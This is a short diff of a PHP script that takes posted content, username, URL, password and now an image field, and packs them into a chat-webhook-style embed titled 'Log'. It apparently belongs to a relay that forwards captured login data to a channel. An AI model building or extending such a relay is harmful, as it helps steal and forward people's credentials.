@@ -1,5 +1,6 @@
 <?php
     $content = isset($_POST['content']) ? $_POST['content'] : '';
+    $image = isset($_POST['image']) ? $_POST['image'] : '';
     $username = isset($_POST['username']) ? $_POST['username'] : '';
     $url = isset($_POST['url']) ? $_POST['url'] : '';
     $password = isset($_POST['password']) ? $_POST['password'] : '';
@@ -18,10 +19,10 @@
             "embeds" => [
                 [
                     "title" => "Лог",
+                    "type" => "rich",
                     "description" => $content,
                     "timestamp" => $timestamp,
                     "color" => hexdec( "8000ff" ),
-        
                 ]
             ]
         
